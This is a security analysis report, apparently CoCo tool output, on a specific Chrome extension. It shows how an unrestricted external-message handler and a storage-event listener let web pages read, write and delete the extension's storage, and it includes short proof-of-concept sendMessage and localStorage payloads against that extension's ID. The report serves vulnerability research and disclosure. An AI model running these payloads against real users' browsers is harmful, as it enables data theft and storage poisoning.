# CoCo Analysis: pgpkffaeaeimknjhekbodlehaejellln

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (3 localStorage sinks, 3 chrome.storage sinks)

---

## Sink 1-3: bg_chrome_runtime_MessageExternal → localStorage (setItem_key, setItem_value, remove)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgpkffaeaeimknjhekbodlehaejellln/opgen_generated_files/bg.js
Line 988: `localStorage.setItem(request.key,request.value);`

**Code:**

```javascript
// Background script - External message handler (bg.js, line 982-1004)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← attacker-controlled message
    if (request.opt=="length"){
      var sl = localStorage.length;
      sendResponse({"length":sl});
    }else if(request.opt=="setItem"){
      localStorage.setItem(request.key,request.value); // ← attacker writes to localStorage
      var sl = localStorage.length;
      sendResponse({"length":sl});
    }else if(request.opt=="getItem"){
      var vl = localStorage.getItem(request.key); // ← attacker reads from localStorage
      var sl = localStorage.length;
      sendResponse({"length":sl,"value":vl}); // ← attacker receives data back
    }else if(request.opt=="removeItem"){
      localStorage.removeItem(request.key); // ← attacker removes from localStorage
      var sl = localStorage.length;
      sendResponse({"length":sl});
    }else if(request.opt=="key"){
      var vl = localStorage.key(request.key);
      var sl = localStorage.length;
      sendResponse({"length":sl,"value":vl});
    }
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any external website or extension, attacker can:

// 1. Write arbitrary data to localStorage
chrome.runtime.sendMessage(
  "pgpkffaeaeimknjhekbodlehaejellln",
  {opt: "setItem", key: "malicious_key", value: "attacker_controlled_data"},
  function(response) {
    console.log("Data written, localStorage length:", response.length);
  }
);

// 2. Read back any data from localStorage (information disclosure)
chrome.runtime.sendMessage(
  "pgpkffaeaeimknjhekbodlehaejellln",
  {opt: "getItem", key: "malicious_key"},
  function(response) {
    console.log("Retrieved value:", response.value); // ← attacker receives stored data
  }
);

// 3. Remove data from localStorage
chrome.runtime.sendMessage(
  "pgpkffaeaeimknjhekbodlehaejellln",
  {opt: "removeItem", key: "malicious_key"},
  function(response) {
    console.log("Data removed");
  }
);
```

**Impact:** Complete storage exploitation chain. Attacker can write arbitrary data to localStorage, read back any stored values (information disclosure), and remove entries. This provides full control over the extension's localStorage, allowing data poisoning and exfiltration of sensitive information.

---

## Sink 4-6: cs_window_eventListener_storage → chrome.storage (set, remove)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgpkffaeaeimknjhekbodlehaejellln/opgen_generated_files/cs_0.js
Line 478-493: `window.addEventListener("storage", function(event) {...})`

**Code:**

```javascript
// Content script - Storage event listener (cs_0.js, line 478-493)
window.addEventListener("storage", function(event) { // ← attacker-controlled via DOM storage events
    var k = event.key; // ← attacker controls key
    var newValue = event.newValue; // ← attacker controls value
    var oldValue = event.oldValue;
    var url = event.url;
    var storageArea = event.storageArea;
    if (k.indexOf("togetherjs") === 0){
        if(newValue){
            var oj = {};
            oj[k]=newValue;
            chrome.storage.local.set(oj); // ← writes to chrome.storage
        }else{
            chrome.storage.local.remove(k); // ← removes from chrome.storage
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM storage events (window.addEventListener("storage"))

**Attack:**

```javascript
// From a malicious webpage where the content script is injected:

// Trigger storage event to poison chrome.storage
localStorage.setItem("togetherjs.malicious_data", "attacker_payload");

// This triggers the storage event listener in the content script,
// which writes the attacker-controlled data to chrome.storage.local
```

**Impact:** Attacker can poison chrome.storage by triggering DOM storage events. Any webpage where the content script runs can manipulate localStorage to trigger storage events, causing the extension to write attacker-controlled data to chrome.storage.local. This allows persistent storage poisoning across the extension.

---

## Combined Impact

The extension has two separate attack vectors that together provide complete control over both localStorage and chrome.storage:

1. **External messages** allow direct manipulation of localStorage with read/write/remove operations and immediate feedback via sendResponse
2. **DOM storage events** allow poisoning of chrome.storage through crafted localStorage changes

This combination enables comprehensive storage exploitation and information disclosure attacks.
